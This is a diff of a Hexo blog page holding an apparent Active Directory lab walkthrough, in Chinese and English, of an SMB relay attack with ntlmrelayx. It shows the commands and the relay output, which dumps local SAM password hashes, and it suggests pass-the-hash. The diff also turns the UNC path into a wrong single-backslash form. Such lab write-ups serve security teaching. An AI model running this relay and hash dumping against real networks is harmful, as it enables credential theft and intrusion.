@@ -75,7 +75,9 @@
   
 
 
-<meta name="generator" content="Hexo 7.3.0"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
 <body>
   <div id="container">
     <div id="particles-js"></div>
@@ -382,7 +384,7 @@
 <p>啟動<a target="_blank" rel="noopener" href="https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py">ntlmrelayx</a>來中繼憑證</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **ntlmrelayx.py -tf target.txt -smb2support**</span><br><span class="line">Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Protocol Client SMB loaded..</span><br><span class="line">[*] Protocol Client SMTP loaded..</span><br><span class="line">/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support <span class="keyword">for</span> it is now deprecated <span class="keyword">in</span> cryptography, and will be removed <span class="keyword">in</span> the next release.</span><br><span class="line">[*] Protocol Client MSSQL loaded..</span><br><span class="line">[*] Protocol Client HTTPS loaded..</span><br><span class="line">[*] Protocol Client HTTP loaded..</span><br><span class="line">[*] Protocol Client IMAPS loaded..</span><br><span class="line">[*] Protocol Client IMAP loaded..</span><br><span class="line">[*] Protocol Client LDAP loaded..</span><br><span class="line">[*] Protocol Client LDAPS loaded..</span><br><span class="line">[*] Running <span class="keyword">in</span> relay mode to hosts <span class="keyword">in</span> targetfile</span><br><span class="line">[*] Setting up SMB Server</span><br><span class="line">[*] Setting up HTTP Server</span><br><span class="line"></span><br><span class="line">[*] Servers started, waiting <span class="keyword">for</span> connections</span><br><span class="line">....</span><br></pre></td></tr></table></figure>
 <p>need to an event to occur, point this directly to ourselves and that relay is going to happen</p>
-<p>在受害機上開啟檔案總管並輸入\\192.168.19.130連線到攻擊者</p>
+<p>在受害機上開啟檔案總管並輸入\192.168.19.130連線到攻擊者</p>
 <p><img src="img/ADInitial_Untitled_14.png" alt="Untitled"></p>
 <p>Attack succeeded or this authentication succeeded</p>
 <ul>
@@ -390,7 +392,7 @@
 </ul>
 <p>Once we have this hash for the administrator, we can use that to login to the machine</p>
 <p>An event (such as LLMNR poisoning) has occurred.  Responder will capture this event, pass it to ntlmrelayx, which will relay the credentials to the targets in our targets.txt file.</p>
-<p>再輸入\\192.168.19.130會回傳credentials 回攻擊機</p>
+<p>再輸入\192.168.19.130會回傳credentials 回攻擊機</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[-] SMBCLient error: [Errno Connection error (192.168.19.150:445)] [Errno 113] No route to host</span><br><span class="line">[*] SMBD-Thread-3: Received connection from 192.168.19.149, attacking target smb://192.168.19.149</span><br><span class="line">[*] SMBD-Thread-4: Received connection from 192.168.19.149, attacking target smb://192.168.19.1</span><br><span class="line">[-] Authenticating against smb://192.168.19.1 as MARVEL\fcastle FAILED</span><br><span class="line">[*] SMBD-Thread-5: Received connection from 192.168.19.149, attacking target smb://192.168.19.150</span><br><span class="line">[*] Authenticating against smb://192.168.19.150 as MARVEL\fcastle SUCCEED</span><br><span class="line">[*] Service RemoteRegistry is <span class="keyword">in</span> stopped state</span><br><span class="line">[*] Service RemoteRegistry is disabled, enabling it</span><br><span class="line">[*] Starting service RemoteRegistry</span><br><span class="line">[*] Target system bootKey: 0x270eea595503845c7b7af622ad54e71e</span><br><span class="line">[*] Dumping <span class="built_in">local</span> SAM hashes (uid:rid:lmhash:nthash)</span><br><span class="line">**Administrator:500:aad3b435b51404eeaad3b435b51404ee:60db62e093ebf3b9270cf92898f7cc03:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:388347163f7f36db1640f63ff0e9e374:::</span><br><span class="line">peterparker:1001:aad3b435b51404eeaad3b435b51404ee:9d45c944752dc08356c32926dbd53bb1:::**</span><br></pre></td></tr></table></figure>
 <p>正如您在此處所看到的，本機 SAM hash已被轉儲。這些哈希值現在可以離線並破解。更好的是，我們可以利用哈希傳遞攻擊來存取機器而無需破解密碼。</p>
 <p>注意：我們沒有也沒有必要破壞網域帳戶。同樣，中繼攻擊的優點在於您不需要知道密碼即可完成攻擊。</p>
